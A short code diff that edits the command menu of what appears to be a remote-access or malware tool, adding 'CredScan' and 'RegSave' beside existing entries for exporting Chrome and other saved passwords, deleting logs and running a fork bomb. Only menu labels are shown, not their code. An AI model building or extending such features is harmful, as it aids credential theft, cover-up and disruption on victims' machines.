@@ -834,8 +834,10 @@ while True:
 			"DiskHost - Host a folder on port 8100",
 			"PassExport - Export Chrome passwords",
 			"DeleteLog - Delete logger.log",
-			"NetScan - Run a basic netscan of local network"
-			"AllPass - Export all found saved passwords"
+			"NetScan - Run a basic netscan of local network",
+			"AllPass - Export all found saved passwords",
+			"CredScan - Scan for credentials in files",
+			"RegSave - Save a registry hive"
 		],
 		"Critical Operations": [
 			"ForkBomb - Attempt a forkbomb",
